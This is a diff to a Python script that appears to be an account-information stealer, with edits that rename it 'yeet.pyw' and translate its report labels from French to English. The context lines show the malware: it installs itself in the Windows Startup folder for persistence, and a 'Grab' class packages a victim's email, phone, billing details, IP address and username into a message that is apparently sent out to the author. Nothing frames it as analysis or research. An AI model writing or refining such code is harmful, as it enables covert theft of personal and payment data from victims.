@@ -17,7 +17,7 @@ from shutil import copy
 
 
 
-path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/purple.pyw" % getenv("userprofile")
+path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/yeet.pyw" % getenv("userprofile")
 
 
 if not isfile(path):
@@ -131,7 +131,7 @@ class Grab:
 
         data = [{
             "title": "Yeet.exe",
-            "description": "Hit!",
+            "description": "Fish has bite!",
             "url": "https://github.com/Krysstals",
             "image": {
                 "url": "https://steamuserimages-a.akamaihd.net/ugc/866241932572866825/B8C599AC2F8DA9157AF27DAB0368EF1E7B971F29/"
@@ -139,12 +139,12 @@ class Grab:
             "color": 0x7519f6,
             "fields": [
                 {
-                    "name": "**Infos Du Compte**",
+                    "name": "**Account Informations**",
                             "value": f'Email: {email}\nPhone: {phone}\nBilling: {billing}',
                             "inline": True
                 },
                 {
-                    "name": "**Infos PC**",
+                    "name": "**PC Information**",
                             "value": f"IP: {ip}\nUser: {computer_username}",
                             "inline": True
                 },
